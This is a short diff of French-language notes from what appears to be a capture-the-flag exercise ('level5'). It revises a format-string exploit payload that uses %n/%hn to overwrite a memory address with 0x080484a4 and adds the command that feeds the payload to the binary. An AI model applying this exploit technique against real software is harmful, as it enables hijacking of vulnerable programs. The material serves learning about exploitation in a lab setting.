@@ -15,4 +15,6 @@ python -c "print '\x38\x98\x04\x08' + '%33952x' + '%4\$hn'" > /tmp/level5
 
 pour utiliser n et donc remplacer les 4 octets on peut faire
 080484a4 = 134513828
-python -c "print '\x38\x98\x04\x08' + '%134513824x' + '%4\$n'" > /tmp/level5
+python -c "print '\x38\x98\x04\x08' + '%134513824o' + '%4\$n'" > /tmp/level5
+
+cat /tmp/level5 - | ./level5 | tr -d ' '
